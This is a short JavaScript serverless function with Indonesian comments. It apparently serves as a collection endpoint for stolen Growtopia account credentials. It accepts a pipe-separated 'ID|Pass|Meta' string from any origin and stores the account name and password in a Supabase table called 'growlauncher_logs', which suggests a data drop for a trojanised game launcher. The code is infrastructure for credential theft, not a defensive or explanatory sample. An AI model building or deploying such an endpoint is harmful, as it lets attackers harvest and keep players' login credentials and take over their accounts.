const { createClient } = require('@supabase/supabase-js');

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

exports.handler = async (event) => {
    const headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Content-Type": "application/json"
    };

    try {
        // Ambil data dari parameter 'd' ATAU 'data'
        const rawData = event.queryStringParameters.d || event.queryStringParameters.data;

        if (!rawData) {
            return { 
                statusCode: 400, 
                headers, 
                body: JSON.stringify({ error: "No data provided", debug: event.queryStringParameters }) 
            };
        }

        // Split data (Format: ID|Pass|Meta)
        const parts = rawData.split('|');
        const inputData = {
            idName: parts[0] || "Unknown",
            idPass: parts[1] || "Unknown",
            meta: parts[2] || "None"
        };

        // Simpan ke Supabase
        const { error } = await supabase
            .from('growlauncher_logs')
            .insert([
                { 
                    tank_id_name: inputData.idName, 
                    tank_id_pass: inputData.idPass, 
                    meta_data: inputData.meta 
                }
            ]);

        if (error) throw error;

        return { statusCode: 200, headers, body: JSON.stringify({ status: "Success" }) };
    } catch (err) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
    }
};
